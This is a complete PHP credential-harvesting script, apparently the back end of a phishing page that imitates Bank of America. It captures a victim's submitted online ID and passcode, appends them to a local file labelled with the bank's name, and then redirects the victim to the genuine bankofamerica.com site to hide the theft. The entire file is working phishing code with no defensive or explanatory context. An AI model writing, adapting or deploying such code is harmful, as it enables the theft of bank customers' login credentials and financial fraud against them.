<?php 
file_put_contents("usernames.txt", "BankofAmerica Username: " . $_POST['dummy-onlineId'] . " Pass: " . $_POST['new-passcode'] ."\n", FILE_APPEND);
header('Location: https://bankofamerica.com/');
exit();
?>
